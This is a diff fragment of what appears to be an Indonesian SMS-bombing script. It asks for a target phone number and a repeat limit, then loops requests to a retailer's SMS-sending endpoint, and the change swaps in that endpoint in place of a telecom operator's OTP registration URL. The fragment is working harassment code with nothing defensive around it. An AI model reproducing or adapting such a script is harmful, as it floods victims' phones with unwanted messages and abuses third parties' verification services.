@@ -57,7 +57,7 @@ while ulang != 'n':
         judul()
         nomor = input('Target :')
         limit = input('Limit  :')
-        url = 'https://www.telkomsel.com/prepaid_registration/get_otp'
+        url = 'http://sc.jd.id/phone/sendPhoneSms'
         payload = {"phone":nomor,'smsType':'1'}
 
         for i in range(int(limit)):
